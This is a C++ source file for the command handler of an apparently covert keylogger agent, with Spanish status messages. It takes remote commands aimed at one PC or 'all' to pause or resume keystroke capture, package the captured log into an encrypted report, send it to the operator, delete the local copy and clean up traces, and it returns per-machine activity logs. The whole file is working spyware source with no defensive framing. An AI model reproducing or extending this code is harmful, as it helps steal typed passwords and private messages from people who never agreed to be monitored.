#include "application/commands/CommandHandler.hpp"

#include <algorithm>
#include <fstream>
#include <sstream>

namespace nuub::application::commands {

CommandHandler::CommandHandler(
    domain::services::IKeystrokeService& keystrokes,
    domain::services::IReportingService& reporting,
    interfaces::IReporter& reporter,
    std::string pc_id,
    std::function<void()> on_shutdown)
    : keystrokes_(keystrokes)
    , reporting_(reporting)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id))
    , on_shutdown_(std::move(on_shutdown)) {}

bool CommandHandler::matches_target(const std::string& target) const {
    if (target.empty()) return true; // No target = this PC
    std::string lower_target = target;
    std::transform(lower_target.begin(), lower_target.end(), lower_target.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower_target == lower_pc || lower_target == "all";
}

domain::Result<void> CommandHandler::handle_start(const std::string& target) {
    if (!matches_target(target)) return domain::Result<void>::success();
    reporter_.send_message("El agente esta conectado. Identificador: " + pc_id_);
    return domain::Result<void>::success();
}

domain::Result<void> CommandHandler::handle_status(const std::string& target) {
    if (!matches_target(target)) return domain::Result<void>::success();
    std::string state = keystrokes_.is_paused() ? "Pausado" : "Activo";
    reporter_.send_message("El programa esta " + state + ".");
    return domain::Result<void>::success();
}

domain::Result<void> CommandHandler::handle_pause(const std::string& target) {
    if (!matches_target(target)) return domain::Result<void>::success();
    keystrokes_.pause();
    reporter_.send_message("Registro de teclas pausado.");
    return domain::Result<void>::success();
}

domain::Result<void> CommandHandler::handle_resume(const std::string& target) {
    if (!matches_target(target)) return domain::Result<void>::success();
    keystrokes_.resume();
    reporter_.send_message("Registro de teclas reanudado.");
    return domain::Result<void>::success();
}

domain::Result<void> CommandHandler::handle_getlog(const std::string& target) {
    if (!matches_target(target)) return domain::Result<void>::success();

    reporter_.send_message("Generando y enviando el log maestro...");
    auto log = keystrokes_.clear_log();
    reporting_.flush_buffer(log);
    auto report_path = reporting_.generate_encrypted_report();

    if (report_path) {
        if (reporter_.send_file(*report_path, "Reporte Maestro")) {
            reporting_.delete_report(*report_path);
        }
        reporting_.cleanup(true);
    } else {
        reporter_.send_message("No habia nueva actividad para reportar.");
    }
    return domain::Result<void>::success();
}

domain::Result<void> CommandHandler::handle_shutdown(const std::string& target) {
    if (!matches_target(target)) return domain::Result<void>::success();

    reporter_.send_message("Cerrando de forma segura...");
    auto log = keystrokes_.clear_log();
    reporting_.flush_buffer(log);
    auto report_path = reporting_.generate_encrypted_report();

    if (report_path) {
        if (reporter_.send_file(*report_path, "Reporte Final (Cierre)")) {
            reporting_.delete_report(*report_path);
        }
        reporting_.cleanup(true);
    }

    if (on_shutdown_) on_shutdown_();
    return domain::Result<void>::success();
}

domain::Result<void> CommandHandler::handle_info(const std::string& target) {
    if (!matches_target(target)) return domain::Result<void>::success();

    std::string activity_log = "activity_log.csv";
    std::ifstream file(activity_log);
    if (!file.is_open()) {
        reporter_.send_message("No hay registros de actividad.");
        return domain::Result<void>::success();
    }

    if (target == "all") {
        reporter_.send_file(activity_log, "Registro de Actividad Global");
        return domain::Result<void>::success();
    }

    std::string line;
    std::vector<std::string> lines;
    std::getline(file, line); // skip header

    while (std::getline(file, line)) {
        // Simple CSV parse: timestamp,pc_id,event
        std::istringstream iss(line);
        std::string ts, pc, event;
        if (std::getline(iss, ts, ',') &&
            std::getline(iss, pc, ',') &&
            std::getline(iss, event, ','))
        {
            std::string pc_lower = pc;
            std::transform(pc_lower.begin(), pc_lower.end(), pc_lower.begin(), ::tolower);
            std::string target_lower = target;
            std::transform(target_lower.begin(), target_lower.end(), target_lower.begin(), ::tolower);

            if (pc_lower == target_lower) {
                lines.push_back(ts + ": " + event);
            }
        }
    }

    std::string text;
    for (const auto& l : lines) {
        if (!text.empty()) text += "\n";
        text += l;
    }
    reporter_.send_message(text.empty() ? "Sin eventos para esta PC." : text);
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
